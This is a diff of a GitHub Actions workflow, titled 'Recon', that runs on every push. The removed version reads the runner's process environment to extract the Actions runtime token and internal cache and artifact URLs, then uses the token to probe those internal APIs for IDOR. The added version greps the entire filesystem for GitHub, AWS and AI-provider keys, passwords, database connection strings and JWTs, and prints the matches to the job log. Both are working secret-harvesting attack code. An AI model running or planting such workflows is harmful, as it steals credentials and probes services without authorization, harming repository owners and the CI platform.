@@ -1,81 +1,20 @@
-name: Universal GitHub Actions Recon
+name: Full Disk Secret Recon
 on: [push]
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Probe Internal APIs and Extract Secrets
+      - name: Scan Entire Filesystem for Secrets
         run: |
-          node -e "
-            const fs = require('fs');
-            const https = require('https');
-            const http = require('http');
-
-            // 1. قراءة ذاكرة العملية بالكامل لاستخراج ما تخفيه GitHub
-            const envStr = fs.readFileSync('/proc/self/environ', 'utf8');
-            const envVars = envStr.split('\0');
-            const env = {};
-            for (const pair of envVars) {
-              const idx = pair.indexOf('=');
-              if (idx > 0) env[pair.substring(0, idx)] = pair.substring(idx + 1);
-            }
-
-            // 2. استخراج الروابط والتوكنات الداخلية
-            const runtimeUrl = env.ACTIONS_RUNTIME_URL || env.ACTIONS_RESULTS_URL;
-            const cacheUrl = env.ACTIONS_CACHE_URL;
-            const token = env.ACTIONS_RUNTIME_TOKEN;
-
-            console.log('--- Extracted Internal Secrets ---');
-            console.log('Runtime URL:', runtimeUrl || 'NOT FOUND');
-            console.log('Cache URL:', cacheUrl || 'NOT FOUND');
-            console.log('Runtime Token:', token ? token.substring(0, 20) + '...' : 'NOT FOUND');
-
-            // 3. إذا وجدنا التوكن والروابط، نبدأ بفحص الـ APIs (IDOR Test)
-            if (token && (runtimeUrl || cacheUrl)) {
-              const urlsToTest = [];
-              if (cacheUrl) urlsToTest.push(cacheUrl + '_apis/artifactcache/caches');
-              if (runtimeUrl) {
-                urlsToTest.push(runtimeUrl + '_apis/artifactcache/caches');
-                // محاولة الوصول إلى مسارات الـ Artifacts الداخلية
-                urlsToTest.push(runtimeUrl + '_apis/runs/' + env.GITHUB_RUN_ID + '/artifacts');
-              }
-
-              console.log('\\n--- Probing Internal APIs for IDOR ---');
-              
-              urlsToTest.forEach(testUrl => {
-                try {
-                  const parsedUrl = new URL(testUrl);
-                  const lib = parsedUrl.protocol === 'https:' ? https : http;
-                  
-                  const options = {
-                    hostname: parsedUrl.hostname,
-                    path: parsedUrl.pathname + parsedUrl.search,
-                    method: 'GET',
-                    headers: {
-                      'Authorization': 'Bearer ' + token,
-                      'Accept': 'application/json'
-                    },
-                    timeout: 2000
-                  };
-
-                  const req = lib.request(options, (res) => {
-                    let data = '';
-                    res.on('data', (chunk) => data += chunk);
-                    res.on('end', () => {
-                      console.log('\\nTarget:', testUrl);
-                      console.log('Status:', res.statusCode);
-                      // طباعة أول 500 حرف من الرد لفحصه
-                      console.log('Response:', data.substring(0, 500));
-                    });
-                  });
-                  req.on('error', (e) => console.error('Error probing', testUrl, e.message));
-                  req.on('timeout', () => { req.destroy(); console.log('Timeout probing', testUrl); });
-                  req.end();
-                } catch(e) {
-                  console.log('URL Parse Error:', testUrl);
-                }
-              });
-            } else {
-              console.log('Failed to extract internal runtime tokens.');
-            }
-          "
+          echo "Starting full disk secret scan..."
+          
+          # البحث في الهارد بالكامل (/)، مع تجاهل مجلدات النظام الوهمية لكي لا يعلق السيرفر
+          # -I: تجاهل الملفات الثنائية (Binary files)
+          # -r: البحث في كل المجلدات الفرعية
+          # -E: استخدام التعابير النمطية الممتدة
+          
+          grep -rnI -E "(ghp_|gho_|github_pat_|AKIA|ASIA|sk-ant-|sk-|password|passwd|api_key|secret|token|mongodb://|postgres://|mysql://|eyJ)" / \
+          --exclude-dir={proc,sys,dev,snap,run,mnt,media,boot,libx32,lib32,lost+found,srv} \
+          2>/dev/null | head -n 100
+          
+          echo "Scan complete."
